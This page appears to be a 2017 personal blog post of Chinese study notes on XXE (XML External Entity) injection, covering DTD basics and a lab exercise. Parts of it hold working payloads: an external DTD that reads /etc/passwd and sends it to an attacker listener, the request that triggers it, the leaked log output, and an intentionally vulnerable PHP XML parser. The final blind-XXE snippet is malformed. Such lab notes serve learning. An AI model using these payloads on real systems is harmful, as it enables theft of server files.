@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="XXE漏洞学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE 漏洞学习">
+<meta property="og:url" content="http://yoursite.com/2017/09/04/XXE漏洞学习/index.html">
+<meta property="og:site_name" content="Sec-note">
+<meta property="og:description" content="XXE漏洞学习。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://p2.qhimg.com/t01c0144f2f69a0c5ab.png">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-8-31/58658848.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-9-5/63739933.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-9-5/81480846.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-9-7/66825030.jpg">
+<meta property="og:updated_time" content="2018-03-12T08:09:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XXE 漏洞学习">
+<meta name="twitter:description" content="XXE漏洞学习。">
+<meta name="twitter:image" content="http://p2.qhimg.com/t01c0144f2f69a0c5ab.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/09/04/XXE漏洞学习/"/>
+
+
+
+
+
+  <title>XXE 漏洞学习 | Sec-note</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sec-note</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/04/XXE漏洞学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sec-note">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-note">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XXE 漏洞学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-04T13:20:46+08:00">
+                2017-09-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>XXE漏洞学习。</p>
+<a id="more"></a>
+<h5 id="XXE漏洞学习"><a href="#XXE漏洞学习" class="headerlink" title="XXE漏洞学习"></a>XXE漏洞学习</h5><p>XML被设计为传输和存储数据，其焦点是数据的内容。</p>
+<p>HTML被设计为用来显示数据，其焦点是数据的外观。</p>
+<p>XML把数据从HTML分离。</p>
+<p><img src="http://p2.qhimg.com/t01c0144f2f69a0c5ab.png" alt=""></p>
+<ul>
+<li>什么是 XXE</li>
+<li>XML和DTD的关系</li>
+<li>XXE漏洞原理</li>
+<li>XXE漏洞的类型</li>
+<li>XXE漏洞应用场景以及盲测</li>
+<li>XXE漏洞攻击举例</li>
+</ul>
+<p>数据编写语言，存储结构</p>
+<p>用自己定义的标签来写语句。。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;&gt;
+&lt;girl&gt;
+&lt;hair&gt;Liuhai&lt;/hair&gt;
+&lt;/girl&gt;
+</code></pre><h5 id="XML和DTD的关系"><a href="#XML和DTD的关系" class="headerlink" title="XML和DTD的关系"></a>XML和DTD的关系</h5><p>DTD数据库表结构  XML 数据记录。。 XML按照DTD的格式进行存储，DTD对XML的解析。</p>
+<p>由于DTD，每个XML文件可以携带一个自身格式的描述</p>
+<p>由于DTD，不同组织的人可以使用一个通用DTD来交换数据</p>
+<p>应用程序可以使用一个标准DTD校验从外部世界接收来的XML数据是否有效。。(作为一个标准，校验从外部接收的XML数据是否合法)</p>
+<h5 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h5><p>XML实体可以分为：普通实体，参数实体</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-8-31/58658848.jpg" alt=""></p>
+<p>DTD标签的解析。文档类型定义。  DTD–解释XML。。</p>
+<ul>
+<li><p>内部DTD文档  </p>
+<p>   <code>&lt;!DOCTYPE 跟元素[元素声明]&gt;</code></p>
+</li>
+<li><p>外部DTD文档  </p>
+<p>  &lt;!DOCTYPE 跟元素 SYSTEM “文件名”&gt;</p>
+<p>  或者<br>  &lt;!DOCTYPE 跟元素 PUBLIC “public_ID” 文件名&gt; </p>
+<p>system “DTD文件路径”  外部加载。。dtd类似HTML的js、css的引用。外部和内部的引入。</p>
+</li>
+</ul>
+<p>XML实体：普通实体，参数实体</p>
+<h5 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h5><ul>
+<li>任意文件读取 </li>
+<li>URL请求 ssrf</li>
+<li></li>
+</ul>
+<p>XML、External、Entity、Injection、。</p>
+<p>HTML的一种，一种可扩展的标记语言。。</p>
+<p>标签的解析 DTD</p>
+<p>标签的定义 </p>
+<hr>
+<p> 0904<br><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">浅谈XXE漏洞攻击与防御</a></p>
+<p>XML文档结构包括三部分</p>
+<p>XML声明、DTD文档类型定义、文档结构</p>
+<p>xxe漏洞和DTD文档有关。。</p>
+<p>DTD 文档类型定义可定义合法的XML文档构建模块，它使用一些列合法的元素结构来定义文档结果，DTD可被声明于XL文档中(内部使用)，也可作为一个外部引用。类似与CSS、JS。</p>
+<p>内部声明DTD</p>
+<pre><code>&lt;!DOCTYPE 跟元素 [元素声明]&gt;
+</code></pre><p>引用外部DTD</p>
+<pre><code>&lt;!DOCTYPE 跟元素 SYSTEM &quot;文件名&quot;&gt;
+</code></pre><p>DTD文档中有很多重要的关键字如下：</p>
+<ul>
+<li>DOCTYPE(DTD的声明)</li>
+<li>ENTITY(实体声明)</li>
+<li>SYSTEM、PUBLIC （外部资源申请）</li>
+</ul>
+<ul>
+<li>实体</li>
+</ul>
+<p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用改变量的值。实体按照类型主要分为四种。</p>
+<ul>
+<li>内置实体 (Built-in entities)</li>
+<li>字符实体 (Character entities)</li>
+<li>通用实体 (General entities)</li>
+<li>参数实体 (Parameter entities)</li>
+</ul>
+<p>实体根据引用方式，还可以分为内部实体与外部实体。</p>
+<ul>
+<li>实体类别介绍</li>
+</ul>
+<p>参数实体用%实体声明，引用时也用%实体名称；</p>
+<pre><code>{!ENTITY % ename &quot;entity_value&quot;}
+</code></pre><p>XXE漏洞全称 XML External Entity Injection xml外部实体注入漏洞。XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、内网端口扫描、攻击内网网站。</p>
+<ul>
+<li>XML漏洞检测</li>
+</ul>
+<p><strong>第一步检测XML是否会被成功解析</strong></p>
+<p><strong>第二步检测服务器是否支持DTD引用外部实体；</strong></p>
+<p>如果支持引用外部实体，那么可能存在XXE漏洞</p>
+<hr>
+<p><a href="https://b1ngz.github.io/XXE-learning-note/" target="_blank" rel="noopener">XXE漏洞的简单理解和测试</a></p>
+<p>XXE(XML External Entity Injection)漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载。</p>
+<p>实体(Entities)</p>
+<p>外部实体(Externally Entities)</p>
+<p>简单的理解，一个实体就是一个变量，可以在文档中的其他位置引用改变量。</p>
+<p>实体的声明必须在DTD文件中 或 <code>&lt;!DOCTYPE&gt;</code></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;&gt;
+&lt;!DOCTYPE foo&gt; [
+
+&lt;!ENTITY name &quot;value&quot;&gt;]&gt;
+&lt;foo&gt;
+
+    &lt;value&gt;&amp;name;&lt;/value&gt;
+&lt;/foo&gt;
+</code></pre><p>参数实体的引用是以 %name; 的格式来引用，其他实体则是 &name;的格式， name 为实体名。。</p>
+<p>只有在DTD文件中，参数实体的声明才能引用其他实体。</p>
+<p>参数实体只能在DTD文件中被引用，其他实体在XML文档内引用。</p>
+<ul>
+<li>Blind XXE</li>
+</ul>
+<p>传统的XXE，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器文件，例如提交请求</p>
+<pre><code>&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;usernamne&gt;&amp;file;&lt;/username&gt;
+</code></pre><p>服务器在这个节点中返回etc/passwd的文件内容</p>
+<pre><code>&lt;username&gt;root:1:3.....&lt;/username&gt;
+</code></pre><p>如果服务器没有回显，只能使用 Blind XXE漏洞来构建一条带外信道提取数据。</p>
+<p>XXE</p>
+<hr>
+<h5 id="XML攻击实验"><a href="#XML攻击实验" class="headerlink" title="XML攻击实验"></a><a href="http://www.beesfun.com/2017/04/21/play%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6XXE%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">XML攻击实验</a></h5><p>0905。。通过这个实验，大概了解了XXE注入的一个流程，它引用外部实体，我们通过在外部实体中构造payload来去读取其中的敏感信息。</p>
+<p>这个实验很好，多加练习深刻理解其中的原理。</p>
+<p>练习的目标：读取任意文件，获取隐藏的url，利用获得的信息登入系统</p>
+<pre><code>There are 2 objectives in this exercise:
+
+Get arbitrary file access
+Find the secret URL using the previous bug
+Login as the user admin using the arbitrary file access
+</code></pre><p>检测是否存在XXE，一是是否解析XML文件，而是是否可以引用外部实体。</p>
+<p>请求一下外部实体</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-9-5/63739933.jpg" alt=""></p>
+<p>外部实体的日志信息</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-9-5/81480846.jpg" alt=""></p>
+<p>通过找本地服务器的监听内容，表明目标服务器会解析XML内容，并发出了外部实体请求。</p>
+<ul>
+<li>任意文件读取</li>
+</ul>
+<p>目标服务器会请求外部实体，那么可以在自己的本地服务器写一个payload，test.dtd文件，返回给目标服务器。</p>
+<pre><code>1 &lt;!ENTITY % p1 SYSTEM &quot;file:///etc/passwd&quot;&gt;
+2 &lt;!ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &apos;http://192.168.145.225:8000/BLAH?%p1;&apos;&gt;&quot;&gt;
+3 %p2;
+</code></pre><p>访问目标服务器。。。引用外部实体。。</p>
+<pre><code>POST /login HTTP/1.1
+Host: 192.168.145.243
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: text/xml
+Content-Length: 100
+Referer: http://192.168.145.243/login
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo SYSTEM &quot;http://192.168.145.225:8000/test.dtd&quot;&gt;
+&lt;foo&gt;&amp;e1;&lt;/foo&gt;
+</code></pre><p>在本地服务器的日志可以查看信息</p>
+<pre><code>192.168.145.243 - - [05/Sep/2017 13:28:39] &quot;GET /BLAH?root:x:0:0:root:/root:/bin/sh%0Alp:x:7:7:lp:/var/spool/lpd:/bin/sh%0Anobody:x:65534:65534:nobody:/nonexistent:/bin/false%0Atc:x:1001:50:Linux%20User,,,:/home/tc:/bin/sh%0Apentesterlab:x:1000:50:Linux%20User,,,:/home/pentesterlab:/bin/sh%0Aplay:x:100:65534:Linux%20User,,,:/opt/play-2.1.3/xxe/:/bin/false%0Amysql:x:101:65534:Linux%20User,,,:/home/mysql:/bin/false%0A HTTP/1.1&quot; 404 -
+</code></pre><ul>
+<li>读取文件2</li>
+</ul>
+<p>修改 test.dtd  file的路径改变一下。</p>
+<pre><code>1 &lt;!ENTITY % p1 SYSTEM &quot;file:///opt/play-2.1.3/xxe/&quot;&gt;
+  2 &lt;!ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &apos;http://192.168.145.225:8000/id?%p1;&apos;&gt;&quot;&gt;
+  3 %p2;
+</code></pre><p>读取到的信息。。URL可以解码一下。</p>
+<pre><code>192.168.145.243 - - [05/Sep/2017 13:36:51] &quot;GET /id?.gitignore%0A.settings%0Aapp%0Aconf%0Alogs%0Aproject%0Apublic%0AREADME%0ARUNNING_PID%0Atarget%0Atest%0A HTTP/1.1&quot; 404 -
+</code></pre><p>如下</p>
+<pre><code>.gitignore
+.settings
+app
+conf
+logs
+project
+public
+README
+RUNNING_PID
+target
+test
+</code></pre><hr>
+<p><a href="http://rickgray.me/2015/06/08/xml-entity-attack-review.html" target="_blank" rel="noopener">XML实体攻击回顾</a></p>
+<p>这篇文章关于实体讲解的到位。</p>
+<ul>
+<li><p>外部实体用于加载外部文件的内容。（XXE攻击主要利用此实体）</p>
+<p>  &lt;?xml version=”1.0” encoding=”utf-8”?&gt;<br>  &lt;!DOCTYPE root [</p>
+<pre><code>&lt;!ENTITY outfile SYSTEM &quot;outfile.xml&quot;&gt;
+</code></pre><p>  ]&gt;</p>
+  <root><outfile>&outfile;</outfile></root>
+</li>
+<li><p>参数实体 </p>
+</li>
+</ul>
+<p>用于DTD和文档的内部子集中。与一般实体相比，它以字符(%)开始，以字符(;)结束。只有在DTD文件中才能在参数实体声明的时候引用其他实体。（XXE攻击常结合利用参数实体进行数据回显）</p>
+<hr>
+<p><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="noopener">XXE的盲注</a></p>
+<p>这篇文章主要讲解了XXE的盲注的利用。做的那个实验就是XXE的盲注。。</p>
+<p>参数实体是一种只能在DTD中定义和使用的实体。一般引用时使用%作为前缀,;为结束。</p>
+<hr>
+<p><a href="">http://bobao.360.cn/learning/detail/3841.html</a><br><a href="http://www.w3school.com.cn/xml/" target="_blank" rel="noopener">XML教程</a></p>
+<hr>
+<p>0906</p>
+<p>学习XXE，必须了解XML、ENtity、DOCTYPE、DTD基础知识。</p>
+<p>参数实体的声明和引用都是以百分号%开头。</p>
+<hr>
+<p><a href="http://www.hackersb.cn/hacker/211.html" target="_blank" rel="noopener">XML实体注入漏洞攻与防</a></p>
+<p>在XML中使用特殊字符，需要使用实体字符，也可以将一些可能多次会使用到的短语设置为实体，然后就可以在内容中使用。</p>
+<p>如下就声明一个名字为 coname 值为 topsec 的实体</p>
+<pre><code>&lt;!DOCTYPE UserData [ &lt;!ENTITY coname &quot;topsec&quot;&gt; ]&gt;
+</code></pre><p>在XML中使用实体，使用 &coname; 即可。</p>
+<p>xxe.php</p>
+<pre><code>&lt;?php
+$xml = file_get_contents(&quot;php://input&quot;);
+$data = simplexml_load_string($xml);
+
+foreach ($data as $key =&gt; $value){
+    echo &quot;Your&quot; . translate($key) . &quot;is: &quot; . $value . &quot;&lt;br&gt;&quot;;
+    }
+
+function translate($str){
+    switch($str){
+        case &quot;name&quot;:
+            return &quot;Name&quot;;
+        case &quot;wechat&quot;:
+            return &quot;Wechat&quot;;
+        case &quot;website&quot;:
+            return &quot;website&quot;;
+
+        }
+
+    }
+?&gt;
+</code></pre><p>访问一下</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//17-9-7/66825030.jpg" alt=""></p>
+<hr>
+<p><a href="https://secure.php.net/function.simplexml-load-string" target="_blank" rel="noopener">simplexml_load_string</a></p>
+<hr>
+<p>libxml 2.8.0  必须有这个。。</p>
+<pre><code>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用。
+</code></pre><p>遇到的坑，需要解决的问题，，<code>libxml Version    2.9.1</code> 自己的版本是2.9.1，默认是不解析外部实体的。。</p>
+<p>现在的问题是卸载，2.9.1安装 2.8.0。</p>
+<p><a href="http://installion.co.uk/ubuntu/trusty/main/l/libxml2-dev/uninstall/index.html" target="_blank" rel="noopener">卸载libxml2</a></p>
+<hr>
+<p>源码安装 php、mysql</p>
+<hr>
+<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p>普通XML利用的payload。</p>
+<ul>
+<li><p>有回显</p>
+<p>  &lt;?xml version=”1.0” encoding=”utf-8”?&gt;<br>  &lt;!DOCTYPE xxe [<br>  &lt;!ELEMENT name ANY &gt;<br>  &lt;!ENTITY xxe SYSTEM “file:///etc/passwd” &gt;]&gt;</p>
+  <root><br>  <name>&xxe;</name><br>  </root>
+
+</li>
+</ul>
+<p>可以在页面看到其中的 /etc/passwd的信息。。</p>
+<hr>
+<p><a href="http://www.mottoin.com/88085.html" target="_blank" rel="noopener">XXE被提起时我们会想到什么</a></p>
+<p>XML外部实体的概念，事实上外部实体是指实体的参数内容，不是当前XML定义的，而是从其他资源引入的。用SYSTEM、PUBLIC来声明。</p>
+<hr>
+<p><a href="http://www.mottoin.com/92794.html" target="_blank" rel="noopener">XXE漏洞的简单理解和测试</a>   这篇文章讲解的很清楚，对于Blind XXE。</p>
+<p>解释了 没有回显盲注的XXE</p>
+<p>因为无法直接将要读取的文件内容发送到服务器，所以需要通过变量的方式，先把要读取的文件内容保存到变量中，然后通过 URL 引用外部实体的方式，在 URL 中引用该变量，让文件内容成为 URL 的一部分(如查询参数)，然后通过查看访问日志的方式来获取数据。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root[
+&lt;!ENTITY % remote SYSTEM &apos;http://192.168.145.225/1.xml&apos;&gt;
+%remotes]&gt;
+&lt;/root&gt;
+</code></pre>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/08/30/Javascript/" rel="next" title="Javascript 基础知识">
+                <i class="fa fa-chevron-left"></i> Javascript 基础知识
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/09/04/Flask表单/" rel="prev" title="Flask 表单">
+                Flask 表单 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Sec-note</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sie504" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#XXE漏洞学习"><span class="nav-number">1.</span> <span class="nav-text">XXE漏洞学习</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#XML和DTD的关系"><span class="nav-number">2.</span> <span class="nav-text">XML和DTD的关系</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#XML实体"><span class="nav-number">3.</span> <span class="nav-text">XML实体</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#危害"><span class="nav-number">4.</span> <span class="nav-text">危害</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#XML攻击实验"><span class="nav-number">5.</span> <span class="nav-text">XML攻击实验</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#payload"><span class="nav-number">6.</span> <span class="nav-text">payload</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sec-note</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
